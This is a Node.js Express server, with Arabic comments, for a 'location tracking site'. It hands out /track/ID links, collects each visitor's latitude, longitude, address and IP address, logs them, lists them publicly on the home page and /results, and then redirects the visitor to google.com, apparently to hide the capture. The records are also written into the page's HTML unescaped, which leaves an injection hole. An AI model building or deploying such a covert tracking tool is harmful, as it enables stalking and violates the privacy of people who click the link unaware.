const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات بسيطة
let locations = [];

app.use(express.static('public'));
app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <h1>موقع تتبع الموقع الجغرافي</h1>
        <p>أنشئ رابط: <strong>/track/YOUR_ID</strong></p>
        <p>مثال: https://your-site.com/track/123456</p>
        <h3>النتائج المسجلة:</h3>
        <pre>${JSON.stringify(locations, null, 2)}</pre>
    `);
});

// رابط التتبع
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    res.sendFile(__dirname + '/public/tracker.html');
});

// API لتلقي بيانات الموقع
app.post('/api/save-location', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    data.ip = req.headers['x-forwarded-for'] || req.ip;
    
    locations.push(data);
    
    console.log('📍 تم تسجيل موقع جديد:');
    console.log('- ID:', data.id);
    console.log('- الموقع:', data.latitude, data.longitude);
    console.log('- العنوان:', data.address);
    console.log('- الوقت:', data.timestamp);
    console.log('- IP:', data.ip);
    console.log('-----------------------------------');
    
    // بعد الحفظ، وجه المستخدم لموقع آخر (اختياري)
    res.json({ 
        success: true, 
        redirect: 'https://google.com' // غير هذا لموقعك
    });
});

// صفحة لعرض جميع النتائج
app.get('/results', (req, res) => {
    res.json(locations);
});

app.listen(PORT, () => {
    console.log(`✅ الخادم يعمل: http://localhost:${PORT}`);
    console.log(`📌 رابط التجربة: http://localhost:${PORT}/track/123456`);
});
